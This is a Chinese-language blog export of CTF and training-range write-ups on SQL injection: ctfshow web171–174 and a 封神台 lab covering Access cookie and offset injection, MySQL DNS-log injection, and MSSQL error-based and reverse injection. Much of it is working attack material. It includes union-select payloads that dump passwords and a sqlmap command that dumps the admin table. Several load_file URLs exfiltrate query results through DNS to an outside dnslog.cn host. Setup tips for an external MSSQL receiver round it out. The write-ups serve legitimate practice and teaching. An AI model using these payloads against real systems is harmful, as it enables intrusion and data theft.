<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><blockquote>
<ul>
<li><strong>根据语句可以看到有flag没有被显示出来，让我们拼接语句来绕过</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>GET传参会自己解码，注释可以用%23（#）, –空格,–+等，或者拼接语句不用注释也行</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727052118542.png" alt="image-20210727052118542"></p>
<ul>
<li><strong>判断有3个字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' order by 3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727052202385.png" alt="image-20210727052202385"></p>
<ul>
<li><strong>联合查询，查表</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727052424376.png" alt="image-20210727052424376"></p>
<ul>
<li>查字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'ctfshow_user'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727052509428.png" alt="image-20210727052509428"></p>
<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727052648926.png" alt="image-20210727052648926"></p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!=='flag')&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>多了层过滤，没有检测到username有flag结果才能查询成功，不查询username，就用password，和上题没区别</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user2<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/flag|[0-9]/i', json_encode($ret)))&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>过滤了数字，考察replace的运用，先判断有几个字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 2 %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091147187.png" alt="image-20210727091147187"></p>
<blockquote>
<ul>
<li><strong>联合函数添加a和b两个数据ok</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091245501.png" alt="image-20210727091245501"></p>
<blockquote>
<ul>
<li>先构造一个replace将0-9全部置换</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="number">1234567890</span>,<span class="number">1</span>,<span class="string">'numA'</span>),<span class="number">2</span>,<span class="string">'numB'</span>),<span class="number">3</span>,<span class="string">'numC'</span>),<span class="number">4</span>,<span class="string">'numD'</span>),<span class="number">5</span>,<span class="string">'numE'</span>),<span class="number">6</span>,<span class="string">'numF'</span>),<span class="number">7</span>,<span class="string">'numG'</span>),<span class="number">8</span>,<span class="string">'numH'</span>),<span class="number">9</span>,<span class="string">'numI'</span>),<span class="string">'0'</span>,<span class="string">'numJ'</span>);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091509981.png" alt="image-20210727091509981"></p>
<blockquote>
<ul>
<li>查表构造语句将1-0换成table_name</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091702800.png" alt="image-20210727091702800"></p>
<blockquote>
<ul>
<li>查字段名</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(column_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user4&#39; %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091826089.png" alt="image-20210727091826089"></p>
<blockquote>
<ul>
<li>查结果</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4--+</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091848759.png" alt="image-20210727091848759"></p>
<blockquote>
<ul>
<li>写个小py来转换一下</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">'ctfshow&#123;numHnumEbnumCnumFenumJd-anumEnumHnumF-numDfbnumC-adnumBnumJ-enumAnumAnumBenumDnumFnumDnumGnumHnumAnumH&#125;'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">flag = flag + flagstr.replace(<span class="string">'numA'</span>,<span class="string">'1'</span>).\</span><br><span class="line">    replace(<span class="string">'numB'</span>,<span class="string">'2'</span>)\</span><br><span class="line">    .replace(<span class="string">'numC'</span>,<span class="string">'3'</span>)\</span><br><span class="line">    .replace(<span class="string">'numD'</span>,<span class="string">'4'</span>)\</span><br><span class="line">    .replace(<span class="string">'numE'</span>,<span class="string">'5'</span>)\</span><br><span class="line">    .replace(<span class="string">'numF'</span>,<span class="string">'6'</span>)\</span><br><span class="line">    .replace(<span class="string">'numG'</span>,<span class="string">'7'</span>)\</span><br><span class="line">    .replace(<span class="string">'numH'</span>,<span class="string">'8'</span>)\</span><br><span class="line">    .replace(<span class="string">'numI'</span>,<span class="string">'9'</span>)\</span><br><span class="line">    .replace(<span class="string">'numJ'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727091931245.png" alt="image-20210727091931245"></p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】数据库注入 wp</title>
    <url>/2021/07/25/%E3%80%90%E5%B0%81%E7%A5%9E%E5%8F%B0%E3%80%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%20wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场数据库注入，练练手！</li>
</ul>
</blockquote>
<h1 id="Access——Cookie注入"><a href="#Access——Cookie注入" class="headerlink" title="Access——Cookie注入"></a>Access——Cookie注入</h1><blockquote>
<ul>
<li>环境<a href="http://59.63.200.79:8004/" target="_blank" rel="noopener">http://59.63.200.79:8004/</a></li>
</ul>
</blockquote>
<ul>
<li><strong>正常情况Cookie注入是可以通过post传参测试的</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725200344696.png" alt="image-20210725200344696"></p>
</blockquote>
<ul>
<li><strong>上面通过改id的参数发现可以cookie注入，废话不多说，抓包，sqlmap走起</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725200630878.png" alt="image-20210725200630878"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725200659338.png" alt="image-20210725200659338"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r 123.txt --batch --threads&#x3D;10 -T admin --dump</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725200724841.png" alt="image-20210725200724841"></p>
</blockquote>
<ul>
<li>MD5解密b9a2a2b5dffb918c ——&gt; welcome直接登录管理员账号</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725200831155.png" alt="image-20210725200831155"></p>
</blockquote>
<ul>
<li><p>突然看到这个决定还是尝试下手注，字段明显有10个<img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725205236332.png" alt="image-20210725205236332"></p>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727100704096.png" alt="image-20210727100704096"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727100353504.png" alt=""></p>
</blockquote>
</li>
<li><p><strong>对了，Access表的查询语法必须包含表，不然就语法不对，所以得用exist爆破表，我这里先猜表里有admin，可以看到有好几个注入点</strong></p>
</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727101111543.png" alt="image-20210727101111543"></p>
<ul>
<li><strong>试着爆出表，利用exists来判断表是否存在</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select 1 and exists(select * from pre_ucenter_members);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727101643530.png" alt="image-20210727101643530"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727101802406.png" alt="image-20210727101802406"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727101850429.png" alt="image-20210727101850429"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727102540727.png" alt="image-20210727102540727"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727104830506.png" alt="image-20210727104830506"></p>
</blockquote>
<ul>
<li>MD5解密，密码welcome，然后和上一个方式一样搞就行</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727104930893.png" alt="image-20210727104930893"></p>
<h1 id="Access——Cookie偏移注入"><a href="#Access——Cookie偏移注入" class="headerlink" title="Access——Cookie偏移注入"></a>Access——Cookie偏移注入</h1><blockquote>
<ul>
<li>环境：<a href="http://59.63.200.79:8004/" target="_blank" rel="noopener">http://59.63.200.79:8004/</a></li>
<li><strong>偏移注入原理：当我们知道一个表名后，比如 admin表，我们就可以用 admin. <em>来表示 admin 当中的所有字段。 admin.</em> =&gt; usernme,password,id (admin表里面所有的字段)。当这个操作可以实现的时候，就表示存在偏移注入。然后我们可以判断字段数，找出回显点，把admin表里面的字段，一个一个往回显点上套，就可以显示出我们需要的数据。</strong></li>
</ul>
</blockquote>
<ul>
<li>首先这个页面的字段数有26个</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727105618503.png" alt="image-20210727105618503"></p>
</blockquote>
<ul>
<li>然后我测出admin表中有16个字段</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727110027370.png" alt="image-20210727110027370"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727110046977.png" alt="image-20210727110046977"></p>
</blockquote>
<ul>
<li><strong>也就是说26-16=10,admin表要从第11个开始</strong></li>
<li><strong>记得要加admin表，Access数据库不支持不带表查询</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727110450271.png" alt="image-20210727110450271"></p>
</blockquote>
<ul>
<li>找到回显点</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727110604395.png" alt="image-20210727110604395"></p>
</blockquote>
<ul>
<li><strong>放在1前面，可以显示4个admin的数据</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">105 union select admin.*,1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727110946423.png" alt="image-20210727110946423"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727111004237.png" alt="image-20210727111004237"></p>
<h1 id="Mysql——DNS注入"><a href="#Mysql——DNS注入" class="headerlink" title="Mysql——DNS注入"></a>Mysql——DNS注入</h1><blockquote>
<ul>
<li>环境<a href="http://59.63.200.79:8014/index3.php" target="_blank" rel="noopener">http://59.63.200.79:8014/index3.php</a></li>
</ul>
</blockquote>
<ul>
<li><strong>一打开发现就直接waf拦截</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727111835964.png" alt="image-20210727111835964"></p>
</blockquote>
<ul>
<li><strong>发现是个老版本的waf，可以用.txt来绕过</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727111926528.png" alt="image-20210727111926528"></p>
</blockquote>
<ul>
<li><strong>然后就是常规的注入测试了，为2个字段</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727112021707.png" alt="image-20210727112021707"></p>
<ul>
<li><strong>但是发现报错不回显，只能思考盲注了，sleep明显刷了5秒，所以是时间盲注，但是题目提醒是DNS注入，所以</strong></li>
<li>地址：<a href="http://dnslog.cn" target="_blank" rel="noopener">http://dnslog.cn</a> 获取地址</li>
</ul>
<blockquote>
<ul>
<li>漏洞原理</li>
<li><strong>Dns注入 =&gt; 让盲注变成显错注入</strong></li>
<li><strong>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。</strong></li>
<li><strong>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。</strong></li>
<li><strong>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727113838870.png" alt="image-20210727113838870"></p>
<ul>
<li><strong>DNS日志记录会返回我们请求的数据信息</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727114028775.png" alt="image-20210727114028775"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727114034885.png" alt="image-20210727114034885"></p>
<ul>
<li><strong>测试一下load_file直接访问dns解析来获取地址</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">load_file('//demo.uf7elz.dnslog.cn/abc')</span><br><span class="line">//就是UNC路径访问共享demo.uf7elz.dnslog.cn的服务器下的共享文件夹abc</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727115110606.png" alt="image-20210727115110606"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727115450751.png" alt="image-20210727115450751"></p>
</blockquote>
<blockquote>
<ul>
<li><strong>注意一点，自测的时候，load_file是需要单独开启的，否则是无法使用的</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>构造一个语句来报错注入，利用concat连接起来，查数据库</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.uf7elz.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727115858391.png" alt="image-20210727115858391"></p>
</blockquote>
<ul>
<li>就直接查表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727120502224.png" alt="image-20210727120502224"></p>
</blockquote>
<ul>
<li>看看还有没有其他的表，抓包</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727121114294.png" alt="image-20210727121114294"></p>
</blockquote>
<ul>
<li>跑一下</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727121138558.png" alt="image-20210727121138558"></p>
</blockquote>
<ul>
<li>就admin有用，那就看看admin 的字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727121350422.png" alt="image-20210727121350422"></p>
<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">admin</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727121618906.png" alt="image-20210727121618906"></p>
</blockquote>
<ul>
<li><strong>总结一下，虽然可以很简单的把盲注变报错注入，但是条件不是很理想。首先目标得带有SMB服务（共享文件），windows自带，linux不自带，目标得有网络。还得开启了文件读取的函数功能。</strong></li>
</ul>
<h1 id="MSSQL——显错注入和反弹注入"><a href="#MSSQL——显错注入和反弹注入" class="headerlink" title="MSSQL——显错注入和反弹注入"></a>MSSQL——显错注入和反弹注入</h1><blockquote>
<ul>
<li>环境 <a href="http://59.63.200.79:8015/?id=1" target="_blank" rel="noopener">http://59.63.200.79:8015/?id=1</a></li>
<li>这个靶场存在两种方式的注入。</li>
<li>第一种是显错注入形式</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>需要严格注意的是MSSQL中对数据类型有严格的要求，猜测输出点的时候填充点用NULL填充</strong></li>
</ul>
</blockquote>
<ul>
<li>判断字段</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727142735390.png" alt="image-20210727142735390"></p>
</blockquote>
<ul>
<li><strong>判断填充数据类型</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727142836484.png" alt="image-20210727142836484"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727142912612.png" alt="image-20210727142912612"></p>
</blockquote>
<ul>
<li><strong>查表名</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'2'</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727143027982.png" alt="image-20210727143027982"></p>
</blockquote>
<ul>
<li><strong>查字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'2'</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727143117122.png" alt="image-20210727143117122"></p>
</blockquote>
<ul>
<li><strong>拿flag</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,token,passwd <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727143230021.png" alt="image-20210727143230021"></p>
</blockquote>
<ul>
<li><strong>第二种方式是采用反弹注入中利用堆叠注入多语句执行</strong></li>
</ul>
<blockquote>
<ul>
<li><strong>定义:存在SQL注入点却无法进行注入、注入工具猜解的速度异常缓慢、错误提示信息关闭、无法返回注入结果等，可以使用反弹注入来进行解决</strong></li>
<li><strong>原理：反弹注入需要依赖于函数opendatasource的支持，将当前数据库中的查询结果发送到另一数据库服务器中，从而获取目标服务器中数据库信息</strong></li>
<li><strong>堆叠注入</strong><ol>
<li><strong>分号（;）是用来表示一条sql语句的结束</strong></li>
<li><strong>多条SQL语句同时执行，可以执行任意语句，不用只局限于一种类型的语句</strong></li>
</ol>
</li>
<li><strong>反弹注入的条件</strong><ol>
<li><strong>有SQL注入，漏洞</strong></li>
<li><strong>外部数据库得插进去（我们要有一个外部数据库）[搭建一个MSSQL的数据库] 公网ip [一台有公网ip的MSSQL数据库]</strong></li>
</ol>
</li>
</ul>
</blockquote>
<blockquote>
<p><strong>MSSQL注入 — 反弹注入实际就是把查询出来的数据发送到我们的MSSQL服务器上，那么我们需要自己的MSSQL数据库和一个公网IP</strong></p>
<p><strong>免费资源：虚拟空间</strong>——在虚拟空间中开启MSSQL然后直接使用，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取一个公网IP。虚拟空间也可以搭建网站和个人博客，有兴趣可以去尝试！</p>
</blockquote>
<blockquote>
<ol>
<li><strong>香港云<a href="http://www.webweb.com" target="_blank" rel="noopener">http://www.webweb.com</a>  随便拿个邮箱然后注册就行（免费60天的试用，过期了就换个邮箱（惊奇的发现匿名邮箱也可以））</strong></li>
